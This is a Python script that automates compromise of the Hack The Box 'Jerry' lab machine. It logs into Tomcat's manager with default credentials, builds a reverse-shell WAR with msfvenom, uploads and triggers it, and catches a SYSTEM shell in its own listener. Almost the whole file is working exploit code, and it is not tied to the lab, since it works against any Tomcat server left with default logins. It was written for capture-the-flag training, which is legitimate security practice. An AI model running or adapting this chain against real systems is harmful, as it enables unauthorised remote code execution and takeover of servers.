#!/usr/bin/env python3
import argparse
import logging
import subprocess
import os
import sys
import time
import urllib.request
import urllib.error
import shutil
import socket
import http.client
import base64
import zipfile
import tempfile
from datetime import datetime
import netifaces
import threading
import select

# ANSI color codes
YELLOW = "\033[33m"
CYAN = "\033[36m"
GREEN = "\033[32m"
MAGENTA = "\033[35m"
RESET = "\033[0m"

# ASCII art and summary
ascii_art = f"""
{YELLOW}
  ___              _                     _____              _         _         
 / _ \            | |                   /  ___|            (_)       | |        
/ /_\ \ _ __    __| |  ___   ____  ___  \ `--.   ___  _ __  _  _ __  | |_  ___  
|  _  || '_ \  / _` | / _ \ |_  / / _ \  `--. \ / __|| '__|| || '_ \ | __|/ __| 
| | | || | | || (_| || (_) | / / |  __/ /\__/ /| (__ | |   | || |_) || |_ \__ \ 
\_| |_/|_| |_| \__,_| \___/ /___| \___| \____/  \___||_|   |_|| .__/  \__||___/ 
                                                              | |               
                                                              |_|               
{RESET}
"""

summary = f"""
{CYAN}Welcome to the Jerry Machine by HTB!
This script targets Jerry, a Windows box at 10.10.10.95.
We'll scan ports, access Tomcat, deploy a WAR payload,
and land a SYSTEM shell without privesc.
Let’s dive in and hack this box!{RESET}
"""

def setup_logging(verbose):
    """Configure logging with colored narrative messages."""
    level = logging.DEBUG if verbose else logging.INFO
    narrative_messages = [
        "Starting our journey by scanning ports",
        "Probing Tomcat with http.client",
        "Creating WAR payload with msfvenom",
        "Uploading WAR with http.client",
        "Starting listener with socket",
        "Waiting for SYSTEM shell",
        "Triggering shell with curl",
        "Got a SYSTEM shell with socket",
        "Here’s what we found"
    ]
    class ColoredFormatter(logging.Formatter):
        def format(self, record):
            msg = record.msg
            is_narrative = any(msg.startswith(n) for n in narrative_messages)
            if record.levelname == 'INFO' and is_narrative:
                tool_map = {
                    'nmap': '\033[35mnmap\033[0m',
                    'socket': '\033[35msocket\033[0m',
                    'curl': '\033[35mcurl\033[0m',
                    'msfvenom': '\033[35mmsfvenom\033[0m',
                    'http.client': '\033[35mhttp.client\033[0m'
                }
                for tool, colored_tool in tool_map.items():
                    msg = msg.replace(tool, colored_tool)
                record.msg = f"\033[32m{msg}\033[0m"
            return super().format(record)
    handler = logging.StreamHandler()
    handler.setFormatter(ColoredFormatter(
        fmt='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%Y-%d %H:%M:%S'
    ))
    logging.getLogger().handlers = [handler]
    logging.getLogger().setLevel(level)

def run_command(command, shell=False):
    """Execute a shell command and return output."""
    try:
        logging.debug(f"Executing command: {command}")
        result = subprocess.run(
            command, shell=shell, check=True, capture_output=True, text=True
        )
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.CalledProcessError as e:
        logging.debug(f"Command failed: {e.stderr}")
        return None, e.stderr

def check_dependencies():
    """Verify required tools are installed."""
    tools = ["curl", "msfvenom"]
    missing = []
    for tool in tools:
        if not shutil.which(tool):
            missing.append(tool)
    try:
        import netifaces
    except ImportError:
        missing.append("python3-netifaces")
    if missing:
        logging.error(f"Missing: {', '.join(missing)}")
        logging.info("Install with: sudo apt install curl metasploit-framework python3-netifaces")
        sys.exit(1)
    logging.info("All required tools are present.")

def get_tun0_ip():
    """Get IP address from tun0 interface."""
    try:
        interfaces = netifaces.interfaces()
        if 'tun0' not in interfaces:
            logging.error("tun0 interface not found. Please specify --lhost")
            sys.exit(1)
        addrs = netifaces.ifaddresses('tun0')
        if netifaces.AF_INET not in addrs:
            logging.error("No IPv4 address on tun0. Please specify --lhost")
            sys.exit(1)
        ip = addrs[netifaces.AF_INET][0]['addr']
        logging.info(f"Detected tun0 IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to get tun0 IP: {e}. Please specify --lhost")
        sys.exit(1)

def check_port(ip, port, timeout=2):
    """Check if a port is open using socket."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((ip, int(port)))
    sock.close()
    return result == 0

def scan_ports(ip):
    """Check assumed ports (80, 443, 8080) for services."""
    logging.info("Starting our journey by scanning ports with socket...")
    common_ports = ["80", "443", "8080"]
    open_ports = []
    for port in common_ports:
        if check_port(ip, port):
            logging.info(f"Port {port} is open")
            open_ports.append(port)
        else:
            logging.debug(f"Port {port} is closed")
    if not open_ports:
        logging.error("No open ports found")
        return []
    logging.info(f"Found open ports: {', '.join(open_ports)}")
    return open_ports

def check_tomcat_manager(ip, port, username, password):
    """Test access to Tomcat manager with credentials."""
    logging.info(f"Probing Tomcat with http.client on port {port}...")
    url = f"/manager/html"
    auth = base64.b64encode(f"{username}:{password}".encode()).decode()
    headers = {"Authorization": f"Basic {auth}"}
    for attempt in range(1, 4):
        try:
            conn = http.client.HTTPConnection(ip, port, timeout=5)
            conn.request("GET", url, headers=headers)
            response = conn.getresponse()
            conn.close()
            if response.status == 200:
                logging.info(f"Tomcat manager access granted with {username}:{password}")
                return True
            logging.debug(f"Attempt {attempt} failed: {response.status} {response.reason}")
            time.sleep(1)
        except Exception as e:
            logging.debug(f"Attempt {attempt} error: {e}")
            time.sleep(1)
    logging.error(f"Tomcat manager access denied on port {port}")
    return False

def generate_war_payload(lhost, lport):
    """Generate a malicious WAR file with msfvenom."""
    logging.info(f"Creating WAR payload with msfvenom...")
    temp_dir = tempfile.gettempdir()
    war_path = os.path.join(temp_dir, "shell.war")
    jsp_path = os.path.join(temp_dir, "shell.jsp")
    msfvenom_cmd = [
        "msfvenom",
        "-p", "java/jsp_shell_reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw",
        "-o", jsp_path
    ]
    stdout, stderr = run_command(msfvenom_cmd)
    if not os.path.exists(jsp_path):
        logging.error(f"Failed to generate JSP payload: {stderr}")
        return None
    try:
        with zipfile.ZipFile(war_path, 'w', zipfile.ZIP_DEFLATED) as war_file:
            war_file.write(jsp_path, "shell.jsp")
        logging.info(f"WAR file saved to {war_path}")
        return war_path
    except Exception as e:
        logging.error(f"Failed to create WAR file: {e}")
        return None
    finally:
        if os.path.exists(jsp_path):
            os.remove(jsp_path)

def upload_war(ip, port, username, password, war_path):
    """Upload the WAR file to Tomcat manager and verify deployment."""
    logging.info(f"Uploading WAR with http.client...")
    url = f"/manager/text/deploy?path=/shell"
    auth = base64.b64encode(f"{username}:{password}".encode()).decode()
    for attempt in range(1, 4):
        try:
            with open(war_path, 'rb') as f:
                war_data = f.read()
            conn = http.client.HTTPConnection(ip, port, timeout=10)
            conn.request("PUT", url, body=war_data, headers={
                "Authorization": f"Basic {auth}",
                "Content-Type": "application/octet-stream"
            })
            response = conn.getresponse()
            response_data = response.read().decode()
            conn.close()
            if response.status == 200 and ("OK" in response_data or "shell" in response_data.lower()):
                jsp_url = f"http://{ip}:{port}/shell/shell.jsp"
                for jsp_attempt in range(1, 4):
                    try:
                        jsp_conn = http.client.HTTPConnection(ip, port, timeout=5)
                        jsp_conn.request("GET", "/shell/shell.jsp")
                        jsp_response = jsp_conn.getresponse()
                        jsp_conn.close()
                        if jsp_response.status == 200:
                            logging.info("WAR deployed successfully")
                            return True
                    except Exception as e:
                        logging.debug(f"JSP check attempt {jsp_attempt}: {e}")
                logging.debug(f"JSP not accessible")
            logging.debug(f"Attempt {attempt} failed: HTTP {response.status}")
            time.sleep(1)
        except Exception as e:
            logging.debug(f"Upload attempt {attempt}: {e}")
            time.sleep(1)
    logging.error("Failed to upload WAR file")
    return False

def start_listener(lhost, lport):
    """Start a listener and handle reverse shell connection."""
    logging.info(f"Starting listener with socket on {lhost}:{lport}...")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((lhost, int(lport)))
        server_socket.listen(1)
        server_socket.settimeout(60)
        logging.info(f"Waiting for SYSTEM shell...")
        client_socket, addr = server_socket.accept()
        logging.info(f"Got a SYSTEM shell with socket from {addr[0]}:{addr[1]}!")
        print(f"Type commands below (type 'exit' to quit):")
        while True:
            rlist, _, _ = select.select([client_socket, sys.stdin], [], [], 0.1)
            if client_socket in rlist:
                data = client_socket.recv(4096).decode(errors='ignore')
                if not data:
                    logging.info("Shell connection closed")
                    break
                sys.stdout.write(data)
                sys.stdout.flush()
            if sys.stdin in rlist:
                cmd = input().strip()
                if cmd.lower() == 'exit':
                    break
                client_socket.send((cmd + '\r\n').encode())
        client_socket.close()
        return True
    except socket.timeout:
        logging.error("Listener timed out. Try manual command")
        return False
    except Exception as e:
        logging.error(f"Listener failed: {e}")
        return False
    finally:
        server_socket.close()

def trigger_shell(ip, port, auto_shell, lhost, lport):
    """Trigger the reverse shell or provide manual command."""
    shell_cmd = f"curl http://{ip}:{port}/shell/shell.jsp"
    if auto_shell:
        logging.info(f"Triggering shell with curl...")
        url = f"http://{ip}:{port}/shell/shell.jsp"
        listener_thread = threading.Thread(target=start_listener, args=(lhost, lport))
        listener_thread.start()
        time.sleep(1)
        try:
            urllib.request.urlopen(url, timeout=5)
            logging.info("Shell trigger sent. Check the shell above!")
            listener_thread.join()
            return True
        except urllib.error.URLError as e:
            logging.error(f"Failed to trigger shell: {e}")
            logging.info(f"Please use the manual command:")
            logging.info(f"$ {shell_cmd}")
            listener_thread.join()
            return False
    else:
        logging.info(f"Here’s your command for a SYSTEM shell:")
        logging.info(f"$ {shell_cmd}")
        logging.info(f"With a listener: nc -lvnp {lport}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Automate enumeration and exploitation for HTB Jerry")
    parser.add_argument("--ip", default="10.10.10.95", help="Target IP address")
    parser.add_argument("--lhost", help="Local host for reverse shell (default: tun0 IP)")
    parser.add_argument("--lport", default="4444", help="Local port for reverse shell")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--shell", action="store_true", help="Automatically trigger reverse shell")
    args = parser.parse_args()

    setup_logging(args.verbose)
    print(ascii_art)
    print(summary)
    check_dependencies()

    lhost = args.lhost if args.lhost else get_tun0_ip()
    ports = scan_ports(args.ip)
    if not ports:
        logging.error("No open ports found. Exiting.")
        sys.exit(1)

    username = "tomcat"
    password = "s3cret"
    tomcat_port = None
    for port in ports:
        if check_tomcat_manager(args.ip, port, username, password):
            tomcat_port = port
            break
    if not tomcat_port:
        logging.error("No valid Tomcat manager found. Exiting.")
        sys.exit(1)

    war_path = generate_war_payload(lhost, args.lport)
    if not war_path:
        logging.error("Failed to generate WAR payload. Exiting.")
        sys.exit(1)

    if not upload_war(args.ip, tomcat_port, username, password, war_path):
        logging.error("Failed to upload WAR file. Exiting.")
        sys.exit(1)

    if not trigger_shell(args.ip, tomcat_port, args.shell, lhost, args.lport):
        logging.info("Attempting to clean up WAR file...")
        conn = http.client.HTTPConnection(args.ip, tomcat_port, timeout=5)
        conn.request("DELETE", "/manager/text/undeploy?path=/shell", headers={
            "Authorization": f"Basic {base64.b64encode(f'{username}:{password}'.encode()).decode()}"
        })
        conn.close()

    logging.info(f"{GREEN}Here’s what we found on our journey through Jerry...{RESET}")
    logging.info("Summary:")
    logging.info(f"Open ports: {', '.join(ports)}")
    logging.info(f"Tomcat credentials: {username}/{password}")
    logging.info(f"WAR deployed: http://{args.ip}:{tomcat_port}/shell/shell.jsp")
    logging.info("To gain SYSTEM access, run:")
    logging.info(f"$ curl http://{args.ip}:{tomcat_port}/shell/shell.jsp")
    logging.info(f"With a listener: nc -lvnp {args.lport}")
    logging.info("Explore C:\\Users\\Administrator\\Desktop for flags!")

if __name__ == "__main__":
    main()
